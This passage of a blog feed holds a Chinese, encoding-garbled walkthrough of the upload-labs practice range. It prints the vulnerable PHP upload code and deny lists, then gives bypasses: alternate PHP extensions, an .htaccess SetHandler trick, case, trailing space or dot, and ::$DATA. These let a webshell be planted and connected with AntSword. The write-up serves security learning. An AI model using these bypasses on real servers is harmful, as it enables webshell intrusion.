class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            </span><br><span class="line">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>åˆ†æä¸€ä¸‹ä»£ç ï¼š</strong></p><p>è¿™é‡Œä½¿ç”¨äº†æ•°ç»„çš„æ–¹å¼ï¼Œè®¾ç½®äº†é»‘åå•ï¼Œä¸å…è®¸.asp  .aspx  .php  .jsp çš„åç¼€åæ–‡ä»¶è¿›è¡Œä¸Šä¼ ã€‚</p><p><strong>ç»•è¿‡æ€è·¯ï¼š</strong></p><p>phpå¼€å‘äº†è¿™ä¹ˆä¹…äº†ï¼Œä¸æ­¢åªæœ‰è¿™ä¸€ä¸ªæ–‡ä»¶åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶ä»–çš„phpçš„åˆ«åè¿›è¡Œç»•</p><p>è¿‡ï¼š.php3 .php4 .php5 .phtml .phtm .phps .phpt .php345 ï¼ˆä½†æ˜¯è¿™é‡Œæ˜¯æœ‰å‰ææ¡ä»¶çš„ï¼‰å°±æ˜¯å¯¹æ–¹çš„</p><p>æœåŠ¡å™¨çš„é…ç½®æœ‰å¯¹è¿™äº›phpå…¶ä»–çš„æ–‡ä»¶åé…ç½®äº†è§£æçš„è®¾ç½®ï¼Œå¦è®¤å°±ç®—ä½ ä¸Šä¼ ä¸Šå»äº†ï¼Œè¿˜æ˜¯è§£æå¤±è´¥ã€‚</p><p>é…ç½®å¥½äº†å¯¹åº”çš„è§£æï¼Œç›´æ¥ä¿®æ”¹æ–‡ä»¶åå°±å¥½äº†æŠŠ1.phpä¿®æ”¹æˆä½ é…ç½®çš„å¯¹åº”çš„è§£æçš„æ–‡ä»¶åã€‚</p><p><strong>å®ç°æ–¹æ³•ï¼š</strong></p><p>test.phpä¿®æ”¹åtest.phtml    ä¸Šä¼ æˆåŠŸï¼</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523230745151.png" alt="image-20230523230745151"></p><p>èšå‰‘è¿æ¥</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523231053874.png" alt="image-20230523231053874"></p><h2 id="pass-04-æ–‡ä»¶ååç¼€éªŒè¯ï¼Œé…ç½®æ–‡ä»¶è§£ææ§åˆ¶"><a href="#pass-04-æ–‡ä»¶ååç¼€éªŒè¯ï¼Œé…ç½®æ–‡ä»¶è§£ææ§åˆ¶" class="headerlink" title="pass-04(æ–‡ä»¶ååç¼€éªŒè¯ï¼Œé…ç½®æ–‡ä»¶è§£ææ§åˆ¶)"></a>pass-04(æ–‡ä»¶ååç¼€éªŒè¯ï¼Œé…ç½®æ–‡ä»¶è§£ææ§åˆ¶)</h2><p>ä¸Šä¼ æœ¨é©¬å</p><p>æç¤ºï¼šæ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !     </p><p>æŸ¥çœ‹ä¸€ä¸‹æºä»£ç </p><p>é»‘åå•é‡Œé¢ç¦æ­¢ä¸Šä¼ è¿™äº›åç¼€çš„æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.php,.php5,.php4,.php3,.php2,.php1,.html,.htm,.phtml,.pht,.pHp,.pHp5,.pHp4,.pHp3,.pHp2,.pHp1,.Html,.Htm,.pHtml,.jsp,.jspa,.jspx,.jsw,.jsv,.jspf,.jtml,.jSp,.jSpx,.jSpa,.jSw,.jSv,.jSpf,.jHtml,.asp,.aspx,.asa,.asax,.ascx,.ashx,.asmx,.cer,.aSp,.aSpx,.aSa,.aSax,.aScx,.aShx,.aSmx,.cEr,.sWf,.swf,.ini</span><br></pre></td></tr></table></figure><p>  <img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230524203551062.png" alt="image-20230524203551062">     </p><p>ä»æºä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œè¿˜æ˜¯ä½¿ç”¨äº†ä¸€ä¸ªé»‘åå•çš„é™åˆ¶ï¼Œå¯¹æ–‡ä»¶çš„åç¼€åè¿›è¡Œäº†éªŒè¯ï¼Œå¹¶ä¸”é™åˆ¶çš„åç¼€åæ¯”ä¹‹å‰çš„æ›´å¤šã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä»é»‘åå•ä¸­çœ‹å‡ºæ²¡æœ‰å¯¹.htaccessæ–‡ä»¶è¿›è¡ŒéªŒè¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨.htaccessè¿›è¡Œç»•è¿‡ã€‚</p><blockquote><p>.htaccessåŠŸèƒ½ä»‹ç»ï¼šhtaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶å¯ä»¥ä¸ç”¨è·å¾—rootæƒé™ï¼Œå°±å¯ä»¥æ›´æ”¹è¿™ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰çš„æ–‡ä»¶é…ç½®ã€‚é‚£ä¹ˆè¯´æ˜åªè¦åˆ›å»ºä¸€ä¸ª .htaccessæ‰€åœ¨ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶é…ç½®å°±ä¼šéƒ½ä¿®æ”¹è½¬æ¢æˆPHPçš„è§£ææ ¼å¼ã€‚(.htaccessæ–‡ä»¶åªå¯¹ApacheæœåŠ¡å™¨æœ‰æ•ˆ)ã€‚</p></blockquote><p>æ“ä½œæ­¥éª¤ï¼š</p><p>1.é¦–å…ˆå…ˆåˆ›å»ºä¸€ä¸ª .htaccess çš„æ–‡ä»¶åœ¨æ–‡ä»¶ä¸­å†™å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>2.æŠŠè¿™ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šã€‚</p><p>3.å°†ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶åä¿®æ”¹æˆgif/png/jpeå…¶ä¸­æ ¼å¼çš„ä¸€ç§ã€‚æ¯”å¦‚2.png</p><p> ä¸Šä¼ æˆåŠŸã€‚</p><p>4.å°†p.git(ä¸€å¥è¯æœ¨é©¬çš„æ–‡ä»¶)ä¸Šä¼ åˆ°æœåŠ¡å™¨</p><p>è¿™é‡Œçš„å…³é”®ç‚¹å°±æ˜¯.htaccessè¿™ä¸ªæ–‡ä»¶ï¼ŒæŠŠæ‰€æœ‰çš„ç›®å½•ä¸‹çš„æ–‡ä»¶çš„è§£ææ–¹å¼éƒ½ä¿®æ”¹æˆäº†phpï¼Œ</p><p>æ‰€ä»¥æˆ‘ä»¬ç¬¬äºŒæ¬¡ä¸Šä¼ çš„å›¾ç‰‡2.png â€œpngâ€ä¸åœ¨é»‘åå•ä¸­ï¼Œä½†æ˜¯ç”±äº.htaccessæ–‡ä»¶æ‰€ä»¥åˆæŠŠä»–è§£ææˆäº†phpçš„æ ¼å¼ï¼Œæ‰€ä»¥å¯ä»¥å®Œæˆæ­£å¸¸çš„è§£æã€‚</p><h2 id="pass-05-æ–‡ä»¶ååç¼€éªŒè¯-ç‚¹-ç©ºæ ¼-ç‚¹"><a href="#pass-05-æ–‡ä»¶ååç¼€éªŒè¯-ç‚¹-ç©ºæ ¼-ç‚¹" class="headerlink" title="pass-05(æ–‡ä»¶ååç¼€éªŒè¯ ,ç‚¹+ç©ºæ ¼+ç‚¹)"></a>pass-05(æ–‡ä»¶ååç¼€éªŒè¯ ,ç‚¹+ç©ºæ ¼+ç‚¹)</h2><p>æŸ¥çœ‹æºç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">å®šä¹‰ä¸¤ä¸ªå˜é‡ï¼šis_uploadä»£è¡¨æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸï¼Œmsgä»£è¡¨é”™è¯¯ä¿¡æ¯æç¤ºã€‚</span><br><span class="line"></span><br><span class="line">if...sumit</span><br><span class="line">æ£€æµ‹æ˜¯å¦æœ‰è¡¨å•æäº¤æ•°æ®é€šè¿‡æ£€æµ‹$_POSTæ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨â€™submitâ€™é”®åã€‚</span><br><span class="line"></span><br><span class="line">if(file_exits (UPLOAD_PATH))&#123;</span><br><span class="line">å¦‚æœæŒ‡å®šçš„æ–‡ä»¶å¤¹å­˜åœ¨é€šè¿‡æ£€æµ‹ç›®å½•æ˜¯å¦å­˜åœ¨(å³åœ¨æœåŠ¡å™¨ä¸Šæ˜¯å¦æœ‰ä¸Šä¼ æ–‡ä»¶å¤¹)</span><br><span class="line"></span><br><span class="line">$deny_exté»‘åå•,å®šä¹‰äº†ä¸€ä¸ªåŒ…å«ä¸å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹çš„$deny_extæ•°ç»„</span><br><span class="line"></span><br><span class="line">$file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line">è·å–ä¸Šä¼ æ–‡ä»¶åå¹¶åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><span class="line"></span><br><span class="line">$file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">$file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</span><br><span class="line">$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br><span class="line">$file_ext = trim($file_ext); //é¦–å°¾å»ç©º</span><br><span class="line">ä»ä¸Šä¼ æ–‡ä»¶åä¸­æå–æ–‡ä»¶æ‰©å±•åå¹¶è¿è¡Œä¸€äº›å¤§å°å†™è½¬æ¢å’Œå­—ç¬¦ä¸²æ›¿æ¢å¤„ç†ã€‚</span><br><span class="line"></span><br><span class="line">if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">å¦‚æœæ–‡ä»¶ç±»å‹æ˜¯å¯æ¥å—çš„ï¼Œåˆ™æ‰§è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚ã€</span><br><span class="line"></span><br><span class="line">$temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">$img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br><span class="line">è·å–ä¸Šä¼ æ–‡ä»¶åœ¨æœåŠ¡å™¨ä¸´æ—¶ç›®å½•ä¸­çš„è·¯å¾„å’Œåœ¨æŒ‡å®šç›®å½•ä¸­æ˜¾ç¤ºçš„è·¯å¾„ã€‚</span><br><span class="line"></span><br><span class="line">if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">    $is_upload = true;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">å°†ä¸Šä¼ æ–‡ä»¶ä»æœåŠ¡å™¨ä¸´æ—¶ç›®å½•ç§»åŠ¨åˆ°æŒ‡å®šç›®å½•ï¼Œå¹¶ç¡®å®šæ˜¯å¦ä¸Šä¼ æˆåŠŸï¼Œ$msgåˆ™ä¿å­˜äº†ä»»ä½•é”™è¯¯ä¿¡æ¯ã€‚</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">å¦‚æœæ–‡ä»¶ç±»å‹ä¸æ˜¯å¯æ¥å—çš„ï¼Œåˆ™å‘é€é”™è¯¯æç¤ºæ¶ˆæ¯ã€‚</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">å¦‚æœæŒ‡å®šçš„ä¸Šä¼ æ–‡ä»¶å¤¹ä¸å­˜åœ¨ï¼Œåˆ™å‘ç”¨æˆ·è¿”å›ä¸€æ¡é”™è¯¯æ¶ˆæ¯ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>bpæŠ“åŒ…çœ‹çœ‹</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610231428383.png" alt="image-20230610231428383"></p><p>ç”¨èšå‰‘è¿æ¥</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610231151446.png" alt="image-20230610231151446"></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610231315662.png" alt="image-20230610231315662"></p><h2 id="Pass-06-æ–‡ä»¶ååç¼€éªŒè¯ï¼Œå¤§å°å†™ç»•è¿‡"><a href="#Pass-06-æ–‡ä»¶ååç¼€éªŒè¯ï¼Œå¤§å°å†™ç»•è¿‡" class="headerlink" title="Pass-06 (æ–‡ä»¶ååç¼€éªŒè¯ï¼Œå¤§å°å†™ç»•è¿‡)"></a>Pass-06 (æ–‡ä»¶ååç¼€éªŒè¯ï¼Œå¤§å°å†™ç»•è¿‡)</h2><p>æŸ¥çœ‹æç¤ºï¼Œé»‘åå•ç¦æ­¢ä¸Šä¼ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.php,.php5,.php4,.php3,.php2,.html,.htm,.phtml,.pht,.pHp,.pHp5,.pHp4,.pHp3,.pHp2,.Html,.Htm,.pHtml,.jsp,.jspa,.jspx,.jsw,.jsv,.jspf,.jtml,.jSp,.jSpx,.jSpa,.jSw,.jSv,.jSpf,.jHtml,.asp,.aspx,.asa,.asax,.ascx,.ashx,.asmx,.cer,.aSp,.aSpx,.aSa,.aSax,.aScx,.aShx,.aSmx,.cEr,.sWf,.swf,.htaccess,.ini</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºä»£ç </p><p><code>$file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™</code></p><p>æºç ä¸­æ²¡æœ‰è½¬æ¢æˆå°å†™ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡</p><h2 id="Pass-07-æ–‡ä»¶ååç¼€éªŒè¯-ç©ºæ ¼ç»•è¿‡"><a href="#Pass-07-æ–‡ä»¶ååç¼€éªŒè¯-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="Pass-07 (æ–‡ä»¶ååç¼€éªŒè¯,ç©ºæ ¼ç»•è¿‡)"></a>Pass-07 (æ–‡ä»¶ååç¼€éªŒè¯,ç©ºæ ¼ç»•è¿‡)</h2><p><code>$file_name= trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); //ä»£ç ä¸­æ— æ”¶å°¾å»ç©ºå‡½æ•°trim() //å»é™¤å­—ç¬¦ä¸²ä¸­çš„ç©ºæ ¼</code></p><p>æ–¹æ³•ï¼š<code>åç¼€åŠ ç©ºæ ¼</code></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610175638767.png" alt="image-20230610175638767"></p><p>ç„¶åç”¨èšå‰‘è¿æ¥</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610175730423.png" alt="image-20230610175730423"></p><h2 id="pass-08-æ–‡ä»¶ååç¼€éªŒè¯-ç‚¹ç»•è¿‡"><a href="#pass-08-æ–‡ä»¶ååç¼€éªŒè¯-ç‚¹ç»•è¿‡" class="headerlink" title="pass-08(æ–‡ä»¶ååç¼€éªŒè¯,ç‚¹ç»•è¿‡)"></a>pass-08(æ–‡ä»¶ååç¼€éªŒè¯,ç‚¹ç»•è¿‡)</h2><p>ä»£ç ä¸­æ— deldot()å‡½æ•° //åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</p><p>   <code>$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</code></p><p>æ–¹æ³•ï¼š<code>åœ¨åç¼€ . </code></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610223429650.png" alt="image-20230610223429650"></p><p>ç”¨èšå‰‘è¿æ¥</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610223253561.png" alt="image-20230610223253561"></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610223326733.png" alt="image-20230610223326733"></p><h2 id="pass-09-æ–‡ä»¶ååç¼€éªŒè¯-DATAç»•è¿‡"><a href="#pass-09-æ–‡ä»¶ååç¼€éªŒè¯-DATAç»•è¿‡" class="headerlink" title="pass-09(æ–‡ä»¶ååç¼€éªŒè¯,::$DATAç»•è¿‡)"></a>pass-09(æ–‡ä»¶ååç¼€éªŒè¯,::$DATAç»•è¿‡)</h2><p>æºç ä¸­</p><p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA</code></p><p>å°‘äº†str_ireplace(â€˜<code>::$DATA</code>â€˜, â€˜â€™, <code>$file_ext</code>);//å»é™¤å­—ç¬¦ä¸²::$DATA</p><blockquote><p><strong>åˆ©ç”¨Windowsç‰¹æ€§</strong></p><p><strong>åœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+â€<code>::$DATA&quot;</code>ä¼šæŠŠ<code>::$DATA</code>ä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ::$DATAä¹‹å‰çš„æ–‡ä»¶åï¼Œä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€å</strong></p></blockquote><blockquote><p>ç§‘æ™®ä¸€ä¸‹</p><p>ä»€ä¹ˆæ˜¯::$DATAå‘¢ï¼Ÿ</p><p><code>::$DATA</code>è¿™æ˜¯ä¸€ç§windowsæ“ä½œç³»ç»Ÿå¤„ç†æ–‡ä»¶æ—¶çš„ç‰¹æ€§ï¼Œä¸º<code>æ–‡ä»¶æµ</code>ï¼Œå¦‚æœæ–‡ä»¶ååæœ‰æ­¤æ ‡è®°<code>::$DATA</code>,å¹¶ä¸”æ²¡æœ‰åšè¿‡æ»¤ï¼Œwindowsä¼šä¸æ£€æŸ¥ï¼Œç›´æ¥ä¿å­˜è¯¥æ–‡ä»¶ã€‚ä½¿ç”¨ä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€åã€‚</p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬åªè¦åœ¨æ–‡ä»¶ååé¢åŠ ä¸Š::$DATAå°±å¯ä»¥æˆåŠŸç»•è¿‡</p><p><strong>æ–¹æ³•ï¼šåç¼€åŠ ä¸Š::$DATA</strong></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610224605256.png" alt="image-20230610224605256"></p><p>ç”¨èšå‰‘è¿æ¥</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610224421981.png" alt="image-20230610224421981"></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610224445287.png" alt="image-20230610224445287"></p><h2 id="pass-10-æ–‡ä»¶ååç¼€éªŒè¯-ç‚¹-ç©ºæ ¼-ç‚¹"><a href="#pass-10-æ–‡ä»¶ååç¼€éªŒè¯-ç‚¹-ç©ºæ ¼-ç‚¹" class="headerlink" title="pass-10(æ–‡ä»¶ååç¼€éªŒè¯,ç‚¹+ç©ºæ ¼+ç‚¹)"></a>pass-10(æ–‡ä»¶ååç¼€éªŒè¯,ç‚¹+ç©ºæ ¼+ç‚¹)</h2>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´é¶åœºå­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2023/05/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/05/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="websell"><a href="#websell" class="headerlink" title="websell"></a>websell</h2><h3 id="ä»€ä¹ˆå«åšwebshellï¼Ÿ"><a href="#ä»€ä¹ˆå«åšwebshellï¼Ÿ" class="headerlink" title="ä»€ä¹ˆå«åšwebshellï¼Ÿ"></a>ä»€ä¹ˆå«åšwebshellï¼Ÿ</h3><p>1.webshell,ç®€ç§°ä¸ºç½‘é¡µåé—¨ã€‚ç®€å•æ¥è¯´å®ƒæ˜¯è¿è¡Œåœ¨webåº”ç”¨ä¹‹ä¸Šçš„è¿œç¨‹æ§åˆ¶ç¨‹åºã€‚</p><p>2.webshellæ˜¯ä¸€å¼ ç½‘é¡µï¼Œç”±PHPï¼ŒJSP,ASP,NETç­‰è¿™ç±»webåº”ç”¨å¼€å‘ç¨‹åºè¯­è¨€å¼€å‘ï¼Œä½†webshellå¹¶ä¸å…·å¤‡å¸¸è§ç½‘é¡µçš„åŠŸèƒ½ï¼Œä¾‹å¦‚ç™»å½•ã€æ³¨å†Œã€ä¿¡æ¯å±•ç¤ºç­‰åŠŸèƒ½ï¼Œä¸€èˆ¬ä¼šå…·å¤‡æ–‡ä»¶ç®¡ç†ã€ç«¯å£æ‰«æã€ææƒã€è·å–ç³»ç»Ÿä¿¡æ¯ç­‰åŠŸèƒ½ã€‚</p><h3 id="å¸¸è§çš„webshellæœ‰å“ªäº›ï¼Ÿ"><a href="#å¸¸è§çš„webshellæœ‰å“ªäº›ï¼Ÿ" class="headerlink" 